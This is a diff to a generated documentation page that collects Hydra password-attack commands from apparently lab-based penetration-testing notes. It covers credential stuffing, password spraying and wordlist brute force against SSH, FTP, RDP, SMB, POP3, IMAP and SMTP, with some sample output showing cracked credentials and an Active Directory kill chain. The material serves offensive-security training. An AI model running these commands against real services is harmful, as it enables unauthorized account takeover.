@@ -9,6 +9,30 @@ hideFooterPagination: true
 
 {/* Generated from Commands/hydra.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## Hydra: choose the operation and read the result
+
+Commands and examples collected from your Hydra notes.
+
+### What the result establishes
+
+Validate a reported credential against the exact service and authentication form used in the test.
+
+### Prerequisites and common failures
+
+Wrong failure/success matching, redirects, rate limits and lockouts can invalidate guessing results; establish a controlled baseline first.
+
+### Example 1: Credential stuffing
+
+Run in: **Notebook example**. Saved as written; may include lab values or terminal output.
+
+```bash
+hydra -C user_pass.list ssh://10.100.38.23
+```
+
+## Saved commands and notebook recipes
+
+Commands and examples collected from your Hydra notes.
+
 [Search this tool’s saved examples](/commands/notebook?tool=hydra) · [All tools](/index)
 
 ## Credential stuffing
@@ -18,6 +42,13 @@ hideFooterPagination: true
 ```bash
 hydra -C user_pass.list ssh://10.100.38.23
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Password Attacks: Cracking, Files, and Credential Stores — Credential stuffing](/password-attacks/password-attacks-cheat-sheet#credential-stuffing)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 Saved as written; may include lab values or terminal output.
 
@@ -43,6 +74,13 @@ hydra -L usernames.txt -p 'Texas123!@#' <DMZ_IP> ssh
 # SMB spray once internal (NetExec) — ONE password across users:
 nxc smb <DC> -u usernames.txt -p 'Texas123!@#' --continue-on-success | grep '[+]'
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — 2. Password spraying](/cheatsheets/ad-attack-path-worked-example#2-password-spraying)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -76,6 +114,13 @@ DCSync against DC01
 FULL DOMAIN COMPROMISE
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — 🗺️ The kill chain (this assessment)](/cheatsheets/ad-attack-path-worked-example#-the-kill-chain-this-assessment)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Hydra - Password Attack">
@@ -96,6 +141,13 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-13 11:37:
 [110][pop3] host: 10.129.42.197   login: john   password: Company01!
 1 of 1 target successfully completed, 1 valid password found
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Attacking Email Services: Module Notes — Hydra - Password Attack](/modules/common-services/email#hydra-password-attack)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -121,6 +173,13 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-25 21:44:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-25 21:44:56
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Attacking RDP: Module Notes — Hydra - RDP Password Spraying](/modules/common-services/rdp#hydra-rdp-password-spraying)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Misconfigurations">
@@ -132,6 +191,13 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-25 21:44:
 ```bash
 grcic550@htb[/htb]# hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Common Services: Full Module Reference — Misconfigurations](/modules/common-services/full-reference#misconfigurations-4)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -145,6 +211,13 @@ grcic550@htb[/htb]# hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
 grcic550@htb[/htb]$ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Common Services: Full Module Reference — Password Attacks](/modules/common-services/full-reference#password-attacks)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Phase 0 — Credential Access (Hydra + rockyou.txt against FTP)">
@@ -156,6 +229,13 @@ grcic550@htb[/htb]$ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
 ```text
 hydra -l fiona -P /usr/share/wordlists/rockyou.txt ftp://10.129.78.187
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [FTP Enumeration and File Access — Example 7: Phase 0 — Credential Access (Hydra + rockyou.txt against FTP)](/enumeration/ftp-enumeration-file-transfer-protocol#example-7-phase-0-—-credential-access-hydra-+-rockyou-txt-against-ftp) · [Common Services: Personal Assessment Notes — Phase 0 — Credential Access (Hydra + rockyou.txt against FTP)](/modules/common-services/assessment#phase-0-—-credential-access-hydra-+-rockyou-txt-against-ftp)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -170,6 +250,13 @@ hydra -l <user> -P /usr/share/wordlists/rockyou.txt -t 4 ftp://<IP>
 hydra -L users.txt -P passwords.txt -t 4 <IP> ftp -V
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [FTP Enumeration and File Access — Example 4: When there's no anonymous access: brute force](/enumeration/ftp-enumeration-file-transfer-protocol#example-4-when-theres-no-anonymous-access-brute-force) · [FTP Enumeration and File Access — When there's no anonymous access: brute force](/enumeration/ftp-enumeration-file-transfer-protocol#when-theres-no-anonymous-access-brute-force)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Attacking SSH">
@@ -181,6 +268,13 @@ hydra -L users.txt -P passwords.txt -t 4 <IP> ftp -V
 ```bash
 hydra -l <user> -P /usr/share/wordlists/rockyou.txt -t 4 ssh://<IP>
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Linux Remote Access: SSH, Rsync, and R-Services — Example 3: Attacking SSH](/enumeration/linux-remote-management-protocols-cheat-sheet#example-3-attacking-ssh) · [Linux Remote Access: SSH, Rsync, and R-Services — Attacking SSH](/enumeration/linux-remote-management-protocols-cheat-sheet#attacking-ssh)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -195,6 +289,13 @@ hydra -L user.list -P password.list rdp://10.129.42.197
 xfreerdp /v:10.129.42.197 /u:user /p:password     # connect with GUI
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Remote Access: RDP, WinRM, and WMI — Example 5: RDP (3389)](/enumeration/windows-remote-management-protocols-cheat-sheet#example-5-rdp-3389) · [Password Attacks: Cracking, Files, and Credential Stores — RDP (3389)](/password-attacks/password-attacks-cheat-sheet#rdp-3389)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="SMB (445)">
@@ -206,6 +307,13 @@ xfreerdp /v:10.129.42.197 /u:user /p:password     # connect with GUI
 ```bash
 hydra -L user.list -P password.list smb://10.129.42.197
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Password Attacks: Cracking, Files, and Credential Stores — SMB (445)](/password-attacks/password-attacks-cheat-sheet#smb-445)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -219,6 +327,13 @@ hydra -L user.list -P password.list smb://10.129.42.197
 hydra -L user.list -P password.list ssh://10.129.42.197
 ssh user@10.129.42.197                  # log in once cracked
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Password Attacks: Cracking, Files, and Credential Stores — SSH (22)](/password-attacks/password-attacks-cheat-sheet#ssh-22)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -238,6 +353,13 @@ hydra -l <username> -P passwords.txt -S -s 995 -t 4 <IP> pop3 -V
 hydra -l <username> -P passwords.txt -S -s 993 -t 4 <IP> imap -V
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Read and Search Email with POP3 and IMAP — Brute-forcing credentials with Hydra](/enumeration/email-enumeration-manipulation-pop3-imap#brute-forcing-credentials-with-hydra)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="When you have/seek credentials">
@@ -249,6 +371,13 @@ hydra -l <username> -P passwords.txt -S -s 993 -t 4 <IP> imap -V
 ```bash
 hydra -l <user> -P passwords.txt -t 4 smtp://<IP>
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SMTP Enumeration and Relay Checks — When you have/seek credentials](/enumeration/smtp-enumeration-simple-mail-transfer-protocol#when-you-have/seek-credentials)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -264,6 +393,13 @@ Context from the notebook: No anon? hydra ... ftp://&lt;IP>
 hydra ... ftp://<IP>
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [FTP Enumeration and File Access — Quick reference](/enumeration/ftp-enumeration-file-transfer-protocol#quick-reference)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Default credentials">
@@ -278,6 +414,30 @@ Context from the notebook: Also check vendor documentation and router default-cr
 hydra -C
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Password Attacks: Cracking, Files, and Credential Stores — Default credentials](/password-attacks/password-attacks-cheat-sheet#default-credentials)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [Password Attacks: Cracking, Files, and Credential Stores](/password-attacks/password-attacks-cheat-sheet)
+- [SMTP Enumeration and Relay Checks](/enumeration/smtp-enumeration-simple-mail-transfer-protocol)
+- [Linux Remote Access: SSH, Rsync, and R-Services](/enumeration/linux-remote-management-protocols-cheat-sheet)
+- [Common Services: Personal Assessment Notes](/modules/common-services/assessment)
+- [Common Services: Full Module Reference](/modules/common-services/full-reference)
+- [FTP Enumeration and File Access](/enumeration/ftp-enumeration-file-transfer-protocol)
+- [Active Directory Attack Path: Worked Lab](/cheatsheets/ad-attack-path-worked-example)
+- [Read and Search Email with POP3 and IMAP](/enumeration/email-enumeration-manipulation-pop3-imap)
+- [Attacking Email Services: Module Notes](/modules/common-services/email)
+- [Attacking RDP: Module Notes](/modules/common-services/rdp)
+
+{/* VAULT_RELATED_END */}
